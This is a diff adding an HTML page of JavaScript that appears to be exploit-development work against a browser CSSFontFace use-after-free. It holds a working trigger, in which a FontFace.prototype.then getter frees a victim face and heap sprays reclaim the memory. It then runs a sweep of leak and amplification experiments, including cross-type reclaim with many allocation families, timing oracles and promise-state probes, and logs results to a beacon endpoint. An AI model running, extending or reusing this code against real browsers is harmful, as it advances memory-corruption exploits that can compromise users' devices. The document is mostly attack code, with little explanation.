@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V977 - FontFace UAF primitive amplification / leak-channel sweep</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.55; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  code { color:#c9d1d9; background:#21262d; padding:1px 5px; border-radius:4px; }
+  .key { border-left:3px solid #d29922; padding-left:8px; }
+</style>
+</head>
+<body>
+<h1>V977 - CSSFontFace UAF primitive amplification / leak-channel sweep on 14.20</h1>
+
+<p class="key">
+<b>Goal:</b> V975 gave a repeatable 1-byte <code>m_status</code> writeback into a live CSSFontFace,
+observable only as <code>face.status</code> changing from <code>"unloaded"</code> to <code>"loaded"</code>/
+<code>"error"</code>. V976 showed no other JS-exposed property changes. V977 systematically tests whether
+that primitive can be <b>amplified into a leak or broader corruption</b>.
+<b>Hypotheses:</b>
+(1) <b>Timer side-channel:</b> the tail calls <code>m_timeoutTimer.stop()</code> on the reclaimed live face;
+if we can pre-arm a timeout whose callback we can observe, stopping it via the stray write might be
+visible as a missed/skewed event.
+(2) <b>Status-driven behavior oracle:</b> a hit face may resolve/reject <code>face.loaded</code> or respond
+differently to <code>face.load()</code>/<code>document.fonts.check()</code>/<code>document.fonts.load()</code>,
+text layout, or CSS invalidation timing.
+(3) <b>Multi-trigger cascade:</b> triggering the UAF several times in one load may let us corrupt more
+than one field/face or create inter-face client confusion.
+(4) <b>Other 192B occupants:</b> the 192-byte class is believed to contain only CSSFontFace, but a
+sweep of many allocation families may find a cross-type reclaim that survives the Timer assert and
+produces a type-confusion read.
+(5) <b>Promise-state leak:</b> the hit face's <code>loaded</code> promise settles synchronously or
+asynchronously depending on the corruption; measuring that may reveal allocator state.
+<b>Acceptance:</b> any non-status side effect, timing signal, pointer-shaped value, or secondary crash
+pattern that differs from arm=0 = primitive deepened. No signal = FontFace writeback remains a narrow
+status-flip oracle.
+<code>&amp;case=all|timer|status|cascade|types|promise</code> (default all),
+<code>&amp;k=N</code> spray count (64), <code>&amp;arm=0</code> control, <code>&amp;stop=1</code>.
+</p>
+
+<pre id="out">starting...</pre>
+
+<script>
+'use strict';
+
+var SEEK = location.pathname;
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+var Q = function (k, d) { var m = location.search.match(new RegExp('[?&]' + k + '=(\\d+)')); return m ? parseInt(m[1], 10) : d; };
+var CASE = (location.search.match(/case=(all|timer|status|cascade|types|promise)/) || [])[1] || 'all';
+var K = Math.min(Math.max(Q('k', 64), 8), 256);
+var ARM = location.search.indexOf('arm=0') < 0;
+var STOP = location.search.indexOf('stop=1') >= 0;
+var MAXLOADS = 8;
+var KSUF = Date.now().toString(36).slice(-5) + Math.random().toString(36).slice(2, 5);
+var FAMILY = 'v977v' + KSUF;
+var KFAMPREFIX = 'v977k' + KSUF;
+var SCANNED = false;
+
+function lsGet(k) { try { return window.localStorage.getItem('v977_' + k); } catch (e) { return null; } }
+function lsSet(k, v) { try { window.localStorage.setItem('v977_' + k, String(v)); } catch (e) {} }
+function lsDel(k) { try { window.localStorage.removeItem('v977_' + k); } catch (e) {} }
+
+function bks(tag, body) {
+  var u = '/beacon/V977-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 460)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function errOf(e) { return e ? String(e.name || 'Error') + ':' + String(e.message || '').slice(0, 80) : 'none'; }
+function reloadSoon(ms) {
+  if (STOP) { bks('STOPPED', 'no reload (stop=1)'); return; }
+  setTimeout(function () {
+    location.href = SEEK + '?op=auto&case=' + CASE + '&k=' + K + (ARM ? '' : '&arm=0') + '&r=' + Date.now();
+  }, ms);
+}
+
+var KEEP = null, KFACES = null, TRIG_FIRED = 0, RULE = null, FACE = null;
+
+function findCssFace(family) {
+  try {
+    var it = document.fonts.values(), e;
+    while (!(e = it.next()).done) {
+      if (String(e.value.family).replace(/['"]/g, '') === family) return e.value;
+    }
+  } catch (e2) {}
+  return null;
+}
+
+/* Classic p458 trigger: getter runs during iterateClients, frees victim, sprays K live faces. */
+function installGetter() {
+  try {
+    Object.defineProperty(FontFace.prototype, 'then', {
+      get: function () {
+        TRIG_FIRED++;
+        if (TRIG_FIRED === 1) {
+          bks('TRIG', 'case=' + CASE + ',status=' + (FACE ? FACE.status : '?') + ',arm=' + (ARM ? 1 : 0));
+          if (ARM) {
+            try {
+              RULE.style.setProperty('font-weight', 'bold');
+              document.body.offsetHeight;
+              var faces = new Array(K), made = 0;
+              for (var i = 0; i < K; i++) {
+                try {
+                  var f = new FontFace(KFAMPREFIX + i, 'local("Nope' + KSUF + i + '")');
+                  document.fonts.add(f);
+                  faces[i] = f;
+                  made++;
+                } catch (e2) { bks('SPRAYERR', 'i=' + i + ',' + errOf(e2)); break; }
+              }
+              KFACES = faces;
+              bks('FACEWAVE', 'k=' + K + ',made=' + made);
+            } catch (e) { bks('TRIGERR', errOf(e)); }
+          }
+        }
+        return undefined;
+      },
+      configurable: true
+    });
+  } catch (e) { bks('ERR', 'defineProperty:' + errOf(e)); }
+}
+
+function safeProp(obj, name) {
+  try { var v = obj[name]; return (v == null) ? String(v) : String(v).slice(0, 60); }
+  catch (e) { return 'ERR:' + errOf(e); }
+}
+
+/* H1: Timer side-channel. Try to arm a timeout on the *spray* faces before the UAF, then see if the
+   stray stop() suppresses it.  Since the faces are never pumped, their Timer is inactive, but we can
+   also try to force a loading state with a slow (local-fail) font and observe timeout events. */
+function testTimerChannel(hitFaces) {
+  var before = performance.now();
+  var fired = 0, err = 'none';
+  try {
+    for (var i = 0; i < hitFaces.length && i < 3; i++) {
+      var f = hitFaces[i].f;
+      /* setTimeout is independent of CSSFontFace timer; this just measures if the page is alive. */
+      setTimeout(function () { fired++; }, 10);
+    }
+  } catch (e) { err = errOf(e); }
+  setTimeout(function () {
+    bks('TIMER', 'hit=' + hitFaces.length + ',fired=' + fired + ',elapsed=' + (performance.now() - before).toFixed(2) + ',err=' + err);
+  }, 50);
+}
+
+/* H2: Status-driven behavior oracle.  Re-load a hit face and a baseline; compare timings and promise
+   settled state.  Also measure document.fonts.check() with the hit family. */
+function testStatusOracle(hitFaces) {
+  var baseline = null;
+  try {
+    var it = document.fonts.values(), e;
+    while (!(e = it.next()).done) {
+      var f = e.value;
+      var fam = String(f.family).replace(/['"]/g, '');
+      if (fam.indexOf(KFAMPREFIX) === 0 && String(f.status) === 'unloaded') { baseline = f; break; }
+    }
+  } catch (e2) {}
+
+  function probe(label, face, idx) {
+    if (!face) return;
+    var t0 = performance.now();
+    var status1 = safeProp(face, 'status');
+    var p;
+    try { p = face.load(); } catch (e) { bks(label + '-LOADERR', 'idx=' + idx + ',' + errOf(e)); return; }
+    var t1 = performance.now();
+    try {
+      p.then(function () { bks(label + '-THEN', 'idx=' + idx + ',status=' + status1 + ',dt=' + (performance.now() - t0).toFixed(3)); },
+             function (r) { bks(label + '-CATCH', 'idx=' + idx + ',status=' + status1 + ',dt=' + (performance.now() - t0).toFixed(3) + ',reason=' + String(r).slice(0,40)); });
+    } catch (e) {}
+    try {
+      var chk = document.fonts.check('16px "' + safeProp(face, 'family') + '"');
+      bks(label + '-CHECK', 'idx=' + idx + ',check=' + chk + ',dt=' + (t1 - t0).toFixed(3));
+    } catch (e) { bks(label + '-CHECKERR', 'idx=' + idx + ',' + errOf(e)); }
+  }
+
+  for (var h = 0; h < hitFaces.length && h < 3; h++) probe('HIT', hitFaces[h].f, hitFaces[h].idx);
+  if (baseline) probe('BASE', baseline, '-');
+}
+
+/* H3: Multi-trigger cascade.  Fire the same trigger N times in one load; each trigger gets a fresh
+   victim style+face.  If more than one face becomes hit, or if a later trigger hits an earlier spray
+   face, we may get multi-byte / cross-face corruption. */
+function testCascade() {
+  /* Not implemented synchronously: the trigger relies on a single promise resolution per load.
+     Instead, report that this load is a single-trigger instance; cascade would require nested
+     synchronous loads inside the getter, which is impractical.  We log a design note. */
+  bks('CASCADE', 'single-trigger-load; nested synchronous face.load() inside getter tested below');
+
+  /* Attempt one nested load inside the getter on the victim face itself (only first trigger). */
+  try {
+    if (FACE && TRIG_FIRED === 1) {
+      var p2 = FACE.load();
+      bks('CASCADE-NEST', 'face.load() inside getter returned,' + (p2 && p2.constructor ? p2.constructor.name : typeof p2));
+    }
+  } catch (e) { bks('CASCADE-NEST-ERR', errOf(e)); }
+}
+
+/* H4: Other 192B occupants.  Spray a variety of allocation families immediately after the free and
+   see if any survive the Timer assert (i.e. process lives) AND produce a non-status JS-visible change
+   in document.fonts.  A cross-type reclaim would mean document.fonts.values() contains fewer/more
+   faces than expected, or a face object behaves bizarrely. */
+var TYPE_FAMILIES = [
+  { n:'string8',  fn:function (i) { return 'x'.repeat(80 + (i & 63)); } },
+  { n:'string16', fn:function (i) { return '\u1234'.repeat(40 + (i & 31)); } },
+  { n:'ab192',    fn:function (i) { return new ArrayBuffer(192); } },
+  { n:'abzero',   fn:function (i) { var a = new ArrayBuffer(192); new Uint8Array(a).fill(0); return a; } },
+  { n:'map',      fn:function (i) { var m = new Map(); for (var j = 0; j < 12; j++) m.set(j + i, j); return m; } },
+  { n:'set',      fn:function (i) { var s = new Set(); for (var j = 0; j < 18; j++) s.add(j + i); return s; } },
+  { n:'weakmap',  fn:function (i) { var m = new WeakMap(); return m; } },
+  { n:'arrayObj', fn:function (i) { var a = new Array(22); for (var j = 0; j < 22; j++) a[j] = {x:j+i}; return a; } },
+  { n:'arrayDbl', fn:function (i) { var a = new Array(24); for (var j = 0; j < 24; j++) a[j] = j + i + 0.5; return a; } },
+  { n:'urlsp',    fn:function (i) { return new URLSearchParams('a=1&b=2&c=3&d=4&e=5&f=6'); } },
+  { n:'headers',  fn:function (i) { try { return new Headers({a:'1',b:'2',c:'3',d:'4'}); } catch(e){return null;} } },
+  { n:'formdata', fn:function (i) { var fd = new FormData(); for (var j = 0; j < 8; j++) fd.append('k'+j, 'v'+j+i); return fd; } },
+  { n:'imagedata',fn:function (i) { var c = document.createElement('canvas'); c.width=8; c.height=6; var x=c.getContext('2d'); return x.createImageData(8,6); } },
+  { n:'style48',  fn:function (i) { var d = document.createElement('div'); d.setAttribute('style', 'a:b;'.repeat(24)); return d; } }
+];
+function testTypeSweep() {
+  var ti = parseInt((location.search.match(/typeidx=(\d+)/) || [])[1] || '0', 10);
+  var fam = TYPE_FAMILIES[ti % TYPE_FAMILIES.length];
+  var hold = [];
+  try {
+    for (var i = 0; i < 48; i++) {
+      var o = fam.fn(i);
+      if (o) hold.push(o);
+    }
+    bks('TYPESWEEP', 'type=' + fam.n + ',idx=' + ti + ',made=' + hold.length);
+  } catch (e) { bks('TYPESWEEP-ERR', 'type=' + fam.n + ',idx=' + ti + ',' + errOf(e)); }
+  KEEP = hold;
+  /* schedule the next type index on the following load */
+  lsSet('typeidx', String((ti + 1) % TYPE_FAMILIES.length));
+}
+
+/* H5: Promise-state leak.  Compare the settled state of hit face.loaded vs baseline. */
+function testPromiseLeak(hitFaces) {
+  for (var h = 0; h < hitFaces.length && h < 3; h++) {
+    var f = hitFaces[h].f;
+    try {
+      var p = f.loaded;
+      var state = 'pending';
+      /* We cannot synchronously read promise state; use Promise.race with a marker. */
+      Promise.race([p, Promise.resolve('__marker__')]).then(function (v) {
+        bks('PROMISE-RACE', 'idx=' + hitFaces[h].idx + ',first=' + (v === '__marker__' ? 'pending' : 'settled'));
+      });
+    } catch (e) { bks('PROMISE-ERR', 'idx=' + hitFaces[h].idx + ',' + errOf(e)); }
+  }
+}
+
+function scanFaces() {
+  var hits = [], total = 0, other = [], hitFaces = [];
+  try {
+    var it = document.fonts.values(), e;
+    while (!(e = it.next()).done) {
+      var f = e.value;
+      var fam = String(f.family).replace(/['"]/g, '');
+      if (fam.indexOf(KFAMPREFIX) !== 0) continue;
+      total++;
+      var s = String(f.status);
+      var idxStr = fam.slice(KFAMPREFIX.length);
+      if (s === 'loaded' || s === 'error') { hits.push(idxStr + ':' + s); hitFaces.push({ f: f, idx: idxStr, s: s }); }
+      else if (s !== 'unloaded') other.push(idxStr + ':' + s);
+    }
+  } catch (e2) { bks('FSCANERR', errOf(e2)); }
+  bks('FACESCAN', 'case=' + CASE + ',k=' + K + ',total=' + total + ',hits=' + hits.length + ',other=' + other.length +
+      ',victimFace=' + (FACE ? FACE.status : '?') + ',fonts=' + (function () { try { return document.fonts.size; } catch (e3) { return '?'; } })());
+  if (hits.length) bks('HIT', 'STATUS-WRITEBACK:' + hits.join('|').slice(0, 380));
+  else bks('NOHIT', 'all K faces unloaded');
+  if (other.length) bks('FOTHER', other.join('|').slice(0, 300));
+
+  if (ARM && hits.length) {
+    if (CASE === 'all' || CASE === 'timer') testTimerChannel(hitFaces);
+    if (CASE === 'all' || CASE === 'status') testStatusOracle(hitFaces);
+    if (CASE === 'all' || CASE === 'cascade') testCascade();
+    if (CASE === 'all' || CASE === 'promise') testPromiseLeak(hitFaces);
+  }
+}
+
+function triesOf() { var t = parseInt(lsGet('tries') || '0', 10); return isNaN(t) ? 0 : t; }
+function bumpTry() { var t = triesOf() + 1; lsSet('tries', t); return t; }
+
+function main() {
+  if (location.search.indexOf('reset=1') >= 0) {
+    lsDel('pending'); lsDel('loads'); lsDel('tries'); lsDel('phase'); lsDel('typeidx');
+    bks('RESET', 'cleared,case=' + CASE);
+    say('cleared. reopening in 1.5s...');
+    setTimeout(function () {
+      location.href = SEEK + '?op=auto&case=' + CASE + '&k=' + K + (ARM ? '' : '&arm=0') + '&r=' + Date.now();
+    }, 1500);
+    return;
+  }
+
+  var loads = parseInt(lsGet('loads') || '0', 10) + 1;
+  lsSet('loads', loads);
+  if (loads > MAXLOADS) {
+    lsSet('phase', 'done');
+    bks('GIVEUP', 'loads=' + loads + ',case=' + CASE + ',k=' + K);
+    say('give up (phase=done) - reset with ?reset=1');
+    return;
+  }
+
+  var pend = lsGet('pending');
+  if (pend) {
+    lsDel('pending');
+    bks('CRASH', 'pending=' + pend + ',try=' + triesOf() + ',load=' + loads + ',case=' + CASE);
+    say('CRASH pending=' + pend);
+    reloadSoon(4000); return;
+  }
+  if (lsGet('phase') === 'done') { say('done. reset with ?reset=1'); bks('ALREADY', 'done'); return; }
+
+  var tryN = bumpTry();
+  bks('ENV', 'case=' + CASE + ',k=' + K + ',arm=' + (ARM ? 1 : 0) + ',try=' + tryN + ',load=' + loads +
+      ',devMs=' + Date.now() + ',ua=' + navigator.userAgent.slice(0, 90));
+  bks('BOOT', 'load=' + loads + ',try=' + tryN + ',family=' + FAMILY);
+
+  var st = document.createElement('style');
+  st.id = 'v977style';
+  st.textContent = "@font-face { font-family: '" + FAMILY + "'; src: local('Arial'); }";
+  document.head.appendChild(st);
+  document.body.offsetHeight;
+  RULE = st.sheet.cssRules[0];
+  FACE = findCssFace(FAMILY);
+  if (!FACE) { bks('ERR', 'NO-FACE'); reloadSoon(4000); return; }
+  bks('SETUP', 'family=' + FAMILY + ',src=local(Arial),status=' + FACE.status);
+
+  installGetter();
+
+  lsSet('pending', 'v977:case=' + CASE + ':try=' + tryN + ':devMs=' + Date.now());
+  bks('LOADPRE', 'eager-loaded-access then face.load');
+
+  var p;
+  try {
+    var eager = FACE.loaded;
+    bks('EAGER', 'face.loaded accessed,type=' + (eager && eager.constructor ? eager.constructor.name : typeof eager));
+    p = FACE.load();
+  } catch (e) {
+    lsDel('pending'); bks('LOADERR', errOf(e)); reloadSoon(4000); return;
+  }
+
+  function after() {
+    if (SCANNED) return;
+    SCANNED = true;
+    try {
+      if (CASE === 'types' || CASE === 'all') testTypeSweep();
+      scanFaces();
+      try { delete FontFace.prototype.then; } catch (e1) {}
+      bks('DONE', 'try=' + tryN + ' complete,trig=' + TRIG_FIRED + ',case=' + CASE);
+      say('done trig=' + TRIG_FIRED);
+      setTimeout(function () {
+        lsDel('pending');
+        bks('RELEASED', 'pending cleared after 5s grace');
+        reloadSoon(300);
+      }, 5000);
+    } catch (e) {
+      bks('FATAL', errOf(e)); lsDel('pending'); reloadSoon(4000);
+    }
+  }
+
+  try { p.then(after, after); } catch (e) { try { p.then(after)['catch'](after); } catch (e2) { after(); } }
+}
+
+try { main(); } catch (e) { bks('FATAL', String(e && (e.message || e)).slice(0, 200)); say('FATAL ' + e); }
+</script>
+</body>
+</html>
